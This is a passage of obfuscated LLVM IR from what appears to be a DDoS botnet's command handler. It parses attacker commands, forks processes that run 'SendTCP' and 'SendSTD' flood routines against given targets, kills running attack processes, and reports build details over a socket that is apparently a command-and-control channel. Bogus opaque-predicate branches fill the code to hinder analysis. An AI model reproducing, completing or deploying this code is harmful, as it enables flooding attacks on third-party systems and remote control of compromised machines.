  br i1 %734, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  unreachable

; <label>:735:                                    ; preds = %707
  br label %736

; <label>:736:                                    ; preds = %735, %553
  %737 = load i8**, i8*** %4, align 8
  %738 = getelementptr inbounds i8*, i8** %737, i64 0
  %739 = load i8*, i8** %738, align 8
  %740 = call i32 @strcmp(i8* %739, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.520, i32 0, i32 0)) #9
  %741 = icmp ne i32 %740, 0
  br i1 %741, label %991, label %742

; <label>:742:                                    ; preds = %736
  %743 = load i32, i32* %3, align 4
  %744 = icmp slt i32 %743, 6
  br i1 %744, label %791, label %745

; <label>:745:                                    ; preds = %742
  %746 = load i8**, i8*** %4, align 8
  %747 = getelementptr inbounds i8*, i8** %746, i64 3
  %748 = load i8*, i8** %747, align 8
  %749 = call i32 @atoi(i8* %748) #9
  %750 = icmp eq i32 %749, -1
  br i1 %750, label %791, label %751

; <label>:751:                                    ; preds = %745
  %752 = load i32, i32* @x.85
  %753 = load i32, i32* @y.86
  %754 = sub i32 %752, 1
  %755 = mul i32 %752, %754
  %756 = urem i32 %755, 2
  %757 = icmp eq i32 %756, 0
  %758 = icmp slt i32 %753, 10
  %759 = or i1 %757, %758
  br i1 %759, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %751
  %760 = load i8**, i8*** %4, align 8
  %761 = getelementptr inbounds i8*, i8** %760, i64 2
  %762 = load i8*, i8** %761, align 8
  %763 = call i32 @atoi(i8* %762) #9
  %764 = icmp eq i32 %763, -1
  %765 = load i32, i32* @x.85
  %766 = load i32, i32* @y.86
  %767 = sub i32 %765, 1
  %768 = mul i32 %765, %767
  %769 = urem i32 %768, 2
  %770 = icmp eq i32 %769, 0
  %771 = icmp slt i32 %766, 10
  %772 = or i1 %770, %771
  br i1 %772, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %764, label %791, label %773

; <label>:773:                                    ; preds = %originalBBpart2100
  %774 = load i32, i32* %3, align 4
  %775 = icmp sgt i32 %774, 5
  br i1 %775, label %776, label %782

; <label>:776:                                    ; preds = %773
  %777 = load i8**, i8*** %4, align 8
  %778 = getelementptr inbounds i8*, i8** %777, i64 5
  %779 = load i8*, i8** %778, align 8
  %780 = call i32 @atoi(i8* %779) #9
  %781 = icmp slt i32 %780, 0
  br i1 %781, label %791, label %782

; <label>:782:                                    ; preds = %776, %773
  %783 = load i32, i32* %3, align 4
  %784 = icmp eq i32 %783, 7
  br i1 %784, label %785, label %792

; <label>:785:                                    ; preds = %782
  %786 = load i8**, i8*** %4, align 8
  %787 = getelementptr inbounds i8*, i8** %786, i64 6
  %788 = load i8*, i8** %787, align 8
  %789 = call i32 @atoi(i8* %788) #9
  %790 = icmp slt i32 %789, 1
  br i1 %790, label %791, label %792

; <label>:791:                                    ; preds = %785, %776, %originalBBpart2100, %745, %742
  br label %1273

; <label>:792:                                    ; preds = %785, %782
  %793 = load i8**, i8*** %4, align 8
  %794 = getelementptr inbounds i8*, i8** %793, i64 1
  %795 = load i8*, i8** %794, align 8
  store i8* %795, i8** %24, align 8
  %796 = load i8**, i8*** %4, align 8
  %797 = getelementptr inbounds i8*, i8** %796, i64 2
  %798 = load i8*, i8** %797, align 8
  %799 = call i32 @atoi(i8* %798) #9
  store i32 %799, i32* %25, align 4
  %800 = load i8**, i8*** %4, align 8
  %801 = getelementptr inbounds i8*, i8** %800, i64 3
  %802 = load i8*, i8** %801, align 8
  %803 = call i32 @atoi(i8* %802) #9
  store i32 %803, i32* %26, align 4
  %804 = load i8**, i8*** %4, align 8
  %805 = getelementptr inbounds i8*, i8** %804, i64 4
  %806 = load i8*, i8** %805, align 8
  store i8* %806, i8** %27, align 8
  %807 = load i32, i32* %3, align 4
  %808 = icmp eq i32 %807, 7
  br i1 %808, label %809, label %814

; <label>:809:                                    ; preds = %792
  %810 = load i8**, i8*** %4, align 8
  %811 = getelementptr inbounds i8*, i8** %810, i64 6
  %812 = load i8*, i8** %811, align 8
  %813 = call i32 @atoi(i8* %812) #9
  br label %831

; <label>:814:                                    ; preds = %792
  %815 = load i32, i32* @x.85
  %816 = load i32, i32* @y.86
  %817 = sub i32 %815, 1
  %818 = mul i32 %815, %817
  %819 = urem i32 %818, 2
  %820 = icmp eq i32 %819, 0
  %821 = icmp slt i32 %816, 10
  %822 = or i1 %820, %821
  br i1 %822, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %814
  %823 = load i32, i32* @x.85
  %824 = load i32, i32* @y.86
  %825 = sub i32 %823, 1
  %826 = mul i32 %823, %825
  %827 = urem i32 %826, 2
  %828 = icmp eq i32 %827, 0
  %829 = icmp slt i32 %824, 10
  %830 = or i1 %828, %829
  br i1 %830, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %831

; <label>:831:                                    ; preds = %originalBBpart2104, %809
  %832 = phi i32 [ %813, %809 ], [ 10, %originalBBpart2104 ]
  %833 = load i32, i32* @x.85
  %834 = load i32, i32* @y.86
  %835 = sub i32 %833, 1
  %836 = mul i32 %833, %835
  %837 = urem i32 %836, 2
  %838 = icmp eq i32 %837, 0
  %839 = icmp slt i32 %834, 10
  %840 = or i1 %838, %839
  br i1 %840, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %831
  store i32 %832, i32* %28, align 4
  %841 = load i32, i32* %3, align 4
  %842 = icmp sgt i32 %841, 5
  %843 = load i32, i32* @x.85
  %844 = load i32, i32* @y.86
  %845 = sub i32 %843, 1
  %846 = mul i32 %843, %845
  %847 = urem i32 %846, 2
  %848 = icmp eq i32 %847, 0
  %849 = icmp slt i32 %844, 10
  %850 = or i1 %848, %849
  br i1 %850, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %842, label %851, label %856

; <label>:851:                                    ; preds = %originalBBpart2108
  %852 = load i8**, i8*** %4, align 8
  %853 = getelementptr inbounds i8*, i8** %852, i64 5
  %854 = load i8*, i8** %853, align 8
  %855 = call i32 @atoi(i8* %854) #9
  br label %873

; <label>:856:                                    ; preds = %originalBBpart2108
  %857 = load i32, i32* @x.85
  %858 = load i32, i32* @y.86
  %859 = sub i32 %857, 1
  %860 = mul i32 %857, %859
  %861 = urem i32 %860, 2
  %862 = icmp eq i32 %861, 0
  %863 = icmp slt i32 %858, 10
  %864 = or i1 %862, %863
  br i1 %864, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %856
  %865 = load i32, i32* @x.85
  %866 = load i32, i32* @y.86
  %867 = sub i32 %865, 1
  %868 = mul i32 %865, %867
  %869 = urem i32 %868, 2
  %870 = icmp eq i32 %869, 0
  %871 = icmp slt i32 %866, 10
  %872 = or i1 %870, %871
  br i1 %872, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %873

; <label>:873:                                    ; preds = %originalBBpart2112, %851
  %874 = phi i32 [ %855, %851 ], [ 0, %originalBBpart2112 ]
  %875 = load i32, i32* @x.85
  %876 = load i32, i32* @y.86
  %877 = sub i32 %875, 1
  %878 = mul i32 %875, %877
  %879 = urem i32 %878, 2
  %880 = icmp eq i32 %879, 0
  %881 = icmp slt i32 %876, 10
  %882 = or i1 %880, %881
  br i1 %882, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %873
  store i32 %874, i32* %29, align 4
  store i32 32, i32* %30, align 4
  %883 = load i8*, i8** %24, align 8
  %884 = call i8* @strstr(i8* %883, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #9
  %885 = icmp ne i8* %884, null
  %886 = load i32, i32* @x.85
  %887 = load i32, i32* @y.86
  %888 = sub i32 %886, 1
  %889 = mul i32 %886, %888
  %890 = urem i32 %889, 2
  %891 = icmp eq i32 %890, 0
  %892 = icmp slt i32 %887, 10
  %893 = or i1 %891, %892
  br i1 %893, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %885, label %894, label %946

; <label>:894:                                    ; preds = %originalBBpart2116
  %895 = load i32, i32* @x.85
  %896 = load i32, i32* @y.86
  %897 = sub i32 %895, 1
  %898 = mul i32 %895, %897
  %899 = urem i32 %898, 2
  %900 = icmp eq i32 %899, 0
  %901 = icmp slt i32 %896, 10
  %902 = or i1 %900, %901
  br i1 %902, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %894
  %903 = load i8*, i8** %24, align 8
  %904 = call i8* @strtok(i8* %903, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %904, i8** %31, align 8
  %905 = load i32, i32* @x.85
  %906 = load i32, i32* @y.86
  %907 = sub i32 %905, 1
  %908 = mul i32 %905, %907
  %909 = urem i32 %908, 2
  %910 = icmp eq i32 %909, 0
  %911 = icmp slt i32 %906, 10
  %912 = or i1 %910, %911
  br i1 %912, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %913

; <label>:913:                                    ; preds = %927, %originalBBpart2120
  %914 = load i8*, i8** %31, align 8
  %915 = icmp ne i8* %914, null
  br i1 %915, label %916, label %929

; <label>:916:                                    ; preds = %913
  %917 = call i32 @listFork()
  %918 = icmp ne i32 %917, 0
  br i1 %918, label %927, label %919

; <label>:919:                                    ; preds = %916
  %920 = load i8*, i8** %31, align 8
  %921 = load i32, i32* %25, align 4
  %922 = load i32, i32* %26, align 4
  %923 = load i8*, i8** %27, align 8
  %924 = load i32, i32* %29, align 4
  %925 = load i32, i32* %28, align 4
  %926 = load i32, i32* %30, align 4
  call void @SendTCP(i8* %920, i32 %921, i32 %922, i8* %923, i32 %924, i32 %925, i32 %926)
  call void @_exit(i32 0) #11
  unreachable

; <label>:927:                                    ; preds = %916
  %928 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %928, i8** %31, align 8
  br label %913

; <label>:929:                                    ; preds = %913
  %930 = load i32, i32* @x.85
  %931 = load i32, i32* @y.86
  %932 = sub i32 %930, 1
  %933 = mul i32 %930, %932
  %934 = urem i32 %933, 2
  %935 = icmp eq i32 %934, 0
  %936 = icmp slt i32 %931, 10
  %937 = or i1 %935, %936
  br i1 %937, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %929
  %938 = load i32, i32* @x.85
  %939 = load i32, i32* @y.86
  %940 = sub i32 %938, 1
  %941 = mul i32 %938, %940
  %942 = urem i32 %941, 2
  %943 = icmp eq i32 %942, 0
  %944 = icmp slt i32 %939, 10
  %945 = or i1 %943, %944
  br i1 %945, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %990

; <label>:946:                                    ; preds = %originalBBpart2116
  %947 = load i32, i32* @x.85
  %948 = load i32, i32* @y.86
  %949 = sub i32 %947, 1
  %950 = mul i32 %947, %949
  %951 = urem i32 %950, 2
  %952 = icmp eq i32 %951, 0
  %953 = icmp slt i32 %948, 10
  %954 = or i1 %952, %953
  br i1 %954, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %946
  %955 = call i32 @listFork()
  %956 = icmp ne i32 %955, 0
  %957 = load i32, i32* @x.85
  %958 = load i32, i32* @y.86
  %959 = sub i32 %957, 1
  %960 = mul i32 %957, %959
  %961 = urem i32 %960, 2
  %962 = icmp eq i32 %961, 0
  %963 = icmp slt i32 %958, 10
  %964 = or i1 %962, %963
  br i1 %964, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %956, label %965, label %982

; <label>:965:                                    ; preds = %originalBBpart2128
  %966 = load i32, i32* @x.85
  %967 = load i32, i32* @y.86
  %968 = sub i32 %966, 1
  %969 = mul i32 %966, %968
  %970 = urem i32 %969, 2
  %971 = icmp eq i32 %970, 0
  %972 = icmp slt i32 %967, 10
  %973 = or i1 %971, %972
  br i1 %973, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %965
  %974 = load i32, i32* @x.85
  %975 = load i32, i32* @y.86
  %976 = sub i32 %974, 1
  %977 = mul i32 %974, %976
  %978 = urem i32 %977, 2
  %979 = icmp eq i32 %978, 0
  %980 = icmp slt i32 %975, 10
  %981 = or i1 %979, %980
  br i1 %981, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1273

; <label>:982:                                    ; preds = %originalBBpart2128
  %983 = load i8*, i8** %24, align 8
  %984 = load i32, i32* %25, align 4
  %985 = load i32, i32* %26, align 4
  %986 = load i8*, i8** %27, align 8
  %987 = load i32, i32* %29, align 4
  %988 = load i32, i32* %28, align 4
  %989 = load i32, i32* %30, align 4
  call void @SendTCP(i8* %983, i32 %984, i32 %985, i8* %986, i32 %987, i32 %988, i32 %989)
  call void @_exit(i32 0) #11
  unreachable

; <label>:990:                                    ; preds = %originalBBpart2124
  br label %991

; <label>:991:                                    ; preds = %990, %736
  %992 = load i8**, i8*** %4, align 8
  %993 = getelementptr inbounds i8*, i8** %992, i64 0
  %994 = load i8*, i8** %993, align 8
  %995 = call i32 @strcmp(i8* %994, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.521, i32 0, i32 0)) #9
  %996 = icmp ne i32 %995, 0
  br i1 %996, label %1133, label %997

; <label>:997:                                    ; preds = %991
  %998 = load i32, i32* @x.85
  %999 = load i32, i32* @y.86
  %1000 = sub i32 %998, 1
  %1001 = mul i32 %998, %1000
  %1002 = urem i32 %1001, 2
  %1003 = icmp eq i32 %1002, 0
  %1004 = icmp slt i32 %999, 10
  %1005 = or i1 %1003, %1004
  br i1 %1005, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %997
  %1006 = load i32, i32* %3, align 4
  %1007 = icmp slt i32 %1006, 4
  %1008 = load i32, i32* @x.85
  %1009 = load i32, i32* @y.86
  %1010 = sub i32 %1008, 1
  %1011 = mul i32 %1008, %1010
  %1012 = urem i32 %1011, 2
  %1013 = icmp eq i32 %1012, 0
  %1014 = icmp slt i32 %1009, 10
  %1015 = or i1 %1013, %1014
  br i1 %1015, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1007, label %1044, label %1016

; <label>:1016:                                   ; preds = %originalBBpart2136
  %1017 = load i8**, i8*** %4, align 8
  %1018 = getelementptr inbounds i8*, i8** %1017, i64 2
  %1019 = load i8*, i8** %1018, align 8
  %1020 = call i32 @atoi(i8* %1019) #9
  %1021 = icmp slt i32 %1020, 1
  br i1 %1021, label %1044, label %1022

; <label>:1022:                                   ; preds = %1016
  %1023 = load i32, i32* @x.85
  %1024 = load i32, i32* @y.86
  %1025 = sub i32 %1023, 1
  %1026 = mul i32 %1023, %1025
  %1027 = urem i32 %1026, 2
  %1028 = icmp eq i32 %1027, 0
  %1029 = icmp slt i32 %1024, 10
  %1030 = or i1 %1028, %1029
  br i1 %1030, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1022
  %1031 = load i8**, i8*** %4, align 8
  %1032 = getelementptr inbounds i8*, i8** %1031, i64 3
  %1033 = load i8*, i8** %1032, align 8
  %1034 = call i32 @atoi(i8* %1033) #9
  %1035 = icmp slt i32 %1034, 1
  %1036 = load i32, i32* @x.85
  %1037 = load i32, i32* @y.86
  %1038 = sub i32 %1036, 1
  %1039 = mul i32 %1036, %1038
  %1040 = urem i32 %1039, 2
  %1041 = icmp eq i32 %1040, 0
  %1042 = icmp slt i32 %1037, 10
  %1043 = or i1 %1041, %1042
  br i1 %1043, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br i1 %1035, label %1044, label %1045

; <label>:1044:                                   ; preds = %originalBBpart2140, %1016, %originalBBpart2136
  br label %1273

; <label>:1045:                                   ; preds = %originalBBpart2140
  %1046 = load i8**, i8*** %4, align 8
  %1047 = getelementptr inbounds i8*, i8** %1046, i64 1
  %1048 = load i8*, i8** %1047, align 8
  store i8* %1048, i8** %32, align 8
  %1049 = load i8**, i8*** %4, align 8
  %1050 = getelementptr inbounds i8*, i8** %1049, i64 2
  %1051 = load i8*, i8** %1050, align 8
  %1052 = call i32 @atoi(i8* %1051) #9
  store i32 %1052, i32* %33, align 4
  %1053 = load i8**, i8*** %4, align 8
  %1054 = getelementptr inbounds i8*, i8** %1053, i64 3
  %1055 = load i8*, i8** %1054, align 8
  %1056 = call i32 @atoi(i8* %1055) #9
  store i32 %1056, i32* %34, align 4
  %1057 = load i8*, i8** %32, align 8
  %1058 = call i8* @strstr(i8* %1057, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #9
  %1059 = icmp ne i8* %1058, null
  br i1 %1059, label %1060, label %1092

; <label>:1060:                                   ; preds = %1045
  %1061 = load i8*, i8** %32, align 8
  %1062 = call i8* @strtok(i8* %1061, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %1062, i8** %35, align 8
  br label %1063

; <label>:1063:                                   ; preds = %originalBBpart2144, %1060
  %1064 = load i8*, i8** %35, align 8
  %1065 = icmp ne i8* %1064, null
  br i1 %1065, label %1066, label %1091

; <label>:1066:                                   ; preds = %1063
  %1067 = call i32 @listFork()
  %1068 = icmp ne i32 %1067, 0
  br i1 %1068, label %1073, label %1069

; <label>:1069:                                   ; preds = %1066
  %1070 = load i8*, i8** %35, align 8
  %1071 = load i32, i32* %33, align 4
  %1072 = load i32, i32* %34, align 4
  call void @SendSTD(i8* %1070, i32 %1071, i32 %1072)
  call void @_exit(i32 0) #11
  unreachable

; <label>:1073:                                   ; preds = %1066
  %1074 = load i32, i32* @x.85
  %1075 = load i32, i32* @y.86
  %1076 = sub i32 %1074, 1
  %1077 = mul i32 %1074, %1076
  %1078 = urem i32 %1077, 2
  %1079 = icmp eq i32 %1078, 0
  %1080 = icmp slt i32 %1075, 10
  %1081 = or i1 %1079, %1080
  br i1 %1081, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1073
  %1082 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %1082, i8** %35, align 8
  %1083 = load i32, i32* @x.85
  %1084 = load i32, i32* @y.86
  %1085 = sub i32 %1083, 1
  %1086 = mul i32 %1083, %1085
  %1087 = urem i32 %1086, 2
  %1088 = icmp eq i32 %1087, 0
  %1089 = icmp slt i32 %1084, 10
  %1090 = or i1 %1088, %1089
  br i1 %1090, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1063

; <label>:1091:                                   ; preds = %1063
  br label %1116

; <label>:1092:                                   ; preds = %1045
  %1093 = call i32 @listFork()
  %1094 = icmp ne i32 %1093, 0
  br i1 %1094, label %1095, label %1096

; <label>:1095:                                   ; preds = %1092
  br label %1273

; <label>:1096:                                   ; preds = %1092
  %1097 = load i32, i32* @x.85
  %1098 = load i32, i32* @y.86
  %1099 = sub i32 %1097, 1
  %1100 = mul i32 %1097, %1099
  %1101 = urem i32 %1100, 2
  %1102 = icmp eq i32 %1101, 0
  %1103 = icmp slt i32 %1098, 10
  %1104 = or i1 %1102, %1103
  br i1 %1104, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1096
  %1105 = load i8*, i8** %32, align 8
  %1106 = load i32, i32* %33, align 4
  %1107 = load i32, i32* %34, align 4
  call void @SendSTD(i8* %1105, i32 %1106, i32 %1107)
  call void @_exit(i32 0) #11
  %1108 = load i32, i32* @x.85
  %1109 = load i32, i32* @y.86
  %1110 = sub i32 %1108, 1
  %1111 = mul i32 %1108, %1110
  %1112 = urem i32 %1111, 2
  %1113 = icmp eq i32 %1112, 0
  %1114 = icmp slt i32 %1109, 10
  %1115 = or i1 %1113, %1114
  br i1 %1115, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  unreachable

; <label>:1116:                                   ; preds = %1091
  %1117 = load i32, i32* @x.85
  %1118 = load i32, i32* @y.86
  %1119 = sub i32 %1117, 1
  %1120 = mul i32 %1117, %1119
  %1121 = urem i32 %1120, 2
  %1122 = icmp eq i32 %1121, 0
  %1123 = icmp slt i32 %1118, 10
  %1124 = or i1 %1122, %1123
  br i1 %1124, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1116
  %1125 = load i32, i32* @x.85
  %1126 = load i32, i32* @y.86
  %1127 = sub i32 %1125, 1
  %1128 = mul i32 %1125, %1127
  %1129 = urem i32 %1128, 2
  %1130 = icmp eq i32 %1129, 0
  %1131 = icmp slt i32 %1126, 10
  %1132 = or i1 %1130, %1131
  br i1 %1132, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1133

; <label>:1133:                                   ; preds = %originalBBpart2152, %991
  %1134 = load i8**, i8*** %4, align 8
  %1135 = getelementptr inbounds i8*, i8** %1134, i64 0
  %1136 = load i8*, i8** %1135, align 8
  %1137 = call i32 @strcmp(i8* %1136, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.522, i32 0, i32 0)) #9
  %1138 = icmp ne i32 %1137, 0
  br i1 %1138, label %1223, label %1139

; <label>:1139:                                   ; preds = %1133
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  br label %1140

; <label>:1140:                                   ; preds = %originalBBpart2162, %1139
  %1141 = load i32, i32* @x.85
  %1142 = load i32, i32* @y.86
  %1143 = sub i32 %1141, 1
  %1144 = mul i32 %1141, %1143
  %1145 = urem i32 %1144, 2
  %1146 = icmp eq i32 %1145, 0
  %1147 = icmp slt i32 %1142, 10
  %1148 = or i1 %1146, %1147
  br i1 %1148, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1140
  %1149 = load i64, i64* %37, align 8
  %1150 = load i64, i64* @numpids, align 8
  %1151 = icmp ult i64 %1149, %1150
  %1152 = load i32, i32* @x.85
  %1153 = load i32, i32* @y.86
  %1154 = sub i32 %1152, 1
  %1155 = mul i32 %1152, %1154
  %1156 = urem i32 %1155, 2
  %1157 = icmp eq i32 %1156, 0
  %1158 = icmp slt i32 %1153, 10
  %1159 = or i1 %1157, %1158
  br i1 %1159, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br i1 %1151, label %1160, label %1201

; <label>:1160:                                   ; preds = %originalBBpart2156
  %1161 = load i32*, i32** @pids, align 8
  %1162 = load i64, i64* %37, align 8
  %1163 = getelementptr inbounds i32, i32* %1161, i64 %1162
  %1164 = load i32, i32* %1163, align 4
  %1165 = icmp ne i32 %1164, 0
  br i1 %1165, label %1166, label %1181

; <label>:1166:                                   ; preds = %1160
  %1167 = load i32*, i32** @pids, align 8
  %1168 = load i64, i64* %37, align 8
  %1169 = getelementptr inbounds i32, i32* %1167, i64 %1168
  %1170 = load i32, i32* %1169, align 4
  %1171 = call i32 @getpid() #5
  %1172 = icmp ne i32 %1170, %1171
  br i1 %1172, label %1173, label %1181

; <label>:1173:                                   ; preds = %1166
  %1174 = load i32*, i32** @pids, align 8
  %1175 = load i64, i64* %37, align 8
  %1176 = getelementptr inbounds i32, i32* %1174, i64 %1175
  %1177 = load i32, i32* %1176, align 4
  %1178 = call i32 @kill(i32 %1177, i32 9) #5
  %1179 = load i32, i32* %36, align 4
  %1180 = add nsw i32 %1179, 1
  store i32 %1180, i32* %36, align 4
  br label %1181

; <label>:1181:                                   ; preds = %1173, %1166, %1160
  br label %1182

; <label>:1182:                                   ; preds = %1181
  %1183 = load i32, i32* @x.85
  %1184 = load i32, i32* @y.86
  %1185 = sub i32 %1183, 1
  %1186 = mul i32 %1183, %1185
  %1187 = urem i32 %1186, 2
  %1188 = icmp eq i32 %1187, 0
  %1189 = icmp slt i32 %1184, 10
  %1190 = or i1 %1188, %1189
  br i1 %1190, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1182
  %1191 = load i64, i64* %37, align 8
  %1192 = add i64 %1191, 1
  store i64 %1192, i64* %37, align 8
  %1193 = load i32, i32* @x.85
  %1194 = load i32, i32* @y.86
  %1195 = sub i32 %1193, 1
  %1196 = mul i32 %1193, %1195
  %1197 = urem i32 %1196, 2
  %1198 = icmp eq i32 %1197, 0
  %1199 = icmp slt i32 %1194, 10
  %1200 = or i1 %1198, %1199
  br i1 %1200, label %originalBBpart2162, label %originalBB158alteredBB

originalBBpart2162:                               ; preds = %originalBB158
  br label %1140

; <label>:1201:                                   ; preds = %originalBBpart2156
  %1202 = load i32, i32* %36, align 4
  %1203 = icmp sgt i32 %1202, 0
  br i1 %1203, label %1204, label %1205

; <label>:1204:                                   ; preds = %1201
  br label %1222

; <label>:1205:                                   ; preds = %1201
  %1206 = load i32, i32* @x.85
  %1207 = load i32, i32* @y.86
  %1208 = sub i32 %1206, 1
  %1209 = mul i32 %1206, %1208
  %1210 = urem i32 %1209, 2
  %1211 = icmp eq i32 %1210, 0
  %1212 = icmp slt i32 %1207, 10
  %1213 = or i1 %1211, %1212
  br i1 %1213, label %originalBB164, label %originalBB164alteredBB

originalBB164:                                    ; preds = %originalBB164alteredBB, %1205
  %1214 = load i32, i32* @x.85
  %1215 = load i32, i32* @y.86
  %1216 = sub i32 %1214, 1
  %1217 = mul i32 %1214, %1216
  %1218 = urem i32 %1217, 2
  %1219 = icmp eq i32 %1218, 0
  %1220 = icmp slt i32 %1215, 10
  %1221 = or i1 %1219, %1220
  br i1 %1221, label %originalBBpart2166, label %originalBB164alteredBB

originalBBpart2166:                               ; preds = %originalBB164
  br label %1222

; <label>:1222:                                   ; preds = %originalBBpart2166, %1204
  br label %1223

; <label>:1223:                                   ; preds = %1222, %1133
  %1224 = load i32, i32* @x.85
  %1225 = load i32, i32* @y.86
  %1226 = sub i32 %1224, 1
  %1227 = mul i32 %1224, %1226
  %1228 = urem i32 %1227, 2
  %1229 = icmp eq i32 %1228, 0
  %1230 = icmp slt i32 %1225, 10
  %1231 = or i1 %1229, %1230
  br i1 %1231, label %originalBB168, label %originalBB168alteredBB

originalBB168:                                    ; preds = %originalBB168alteredBB, %1223
  %1232 = load i8**, i8*** %4, align 8
  %1233 = getelementptr inbounds i8*, i8** %1232, i64 0
  %1234 = load i8*, i8** %1233, align 8
  %1235 = call i32 @strcmp(i8* %1234, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.523, i32 0, i32 0)) #9
  %1236 = icmp ne i32 %1235, 0
  %1237 = load i32, i32* @x.85
  %1238 = load i32, i32* @y.86
  %1239 = sub i32 %1237, 1
  %1240 = mul i32 %1237, %1239
  %1241 = urem i32 %1240, 2
  %1242 = icmp eq i32 %1241, 0
  %1243 = icmp slt i32 %1238, 10
  %1244 = or i1 %1242, %1243
  br i1 %1244, label %originalBBpart2170, label %originalBB168alteredBB

originalBBpart2170:                               ; preds = %originalBB168
  br i1 %1236, label %1262, label %1245

; <label>:1245:                                   ; preds = %originalBBpart2170
  %1246 = load i32, i32* @x.85
  %1247 = load i32, i32* @y.86
  %1248 = sub i32 %1246, 1
  %1249 = mul i32 %1246, %1248
  %1250 = urem i32 %1249, 2
  %1251 = icmp eq i32 %1250, 0
  %1252 = icmp slt i32 %1247, 10
  %1253 = or i1 %1251, %1252
  br i1 %1253, label %originalBB172, label %originalBB172alteredBB

originalBB172:                                    ; preds = %originalBB172alteredBB, %1245
  call void @exit(i32 0) #12
  %1254 = load i32, i32* @x.85
  %1255 = load i32, i32* @y.86
  %1256 = sub i32 %1254, 1
  %1257 = mul i32 %1254, %1256
  %1258 = urem i32 %1257, 2
  %1259 = icmp eq i32 %1258, 0
  %1260 = icmp slt i32 %1255, 10
  %1261 = or i1 %1259, %1260
  br i1 %1261, label %originalBBpart2174, label %originalBB172alteredBB

originalBBpart2174:                               ; preds = %originalBB172
  unreachable

; <label>:1262:                                   ; preds = %originalBBpart2170
  %1263 = load i8**, i8*** %4, align 8
  %1264 = getelementptr inbounds i8*, i8** %1263, i64 0
  %1265 = load i8*, i8** %1264, align 8
  %1266 = call i32 @strcmp(i8* %1265, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.524, i32 0, i32 0)) #9
  %1267 = icmp ne i32 %1266, 0
  br i1 %1267, label %1273, label %1268

; <label>:1268:                                   ; preds = %1262
  call void @RemoveTempDirs()
  %1269 = load i32, i32* @mainCommSock, align 4
  %1270 = call i8* @getBuild()
  %1271 = call i32 @getEndianness()
  %1272 = call i32 (i32, i8*, ...) @sockprintf(i32 %1269, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.525, i32 0, i32 0), i8* %1270, i32 %1271)
  br label %1273

; <label>:1273:                                   ; preds = %1268, %1262, %1095, %1044, %originalBBpart2132, %791, %711, %611, %529, %525, %originalBBpart272, %444, %361, %originalBBpart240, %248, %originalBBpart220, %139, %134, %43
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %44
  %1274 = load i8**, i8*** %4, align 8
  %1275 = getelementptr inbounds i8*, i8** %1274, i64 0
  %1276 = load i8*, i8** %1275, align 8
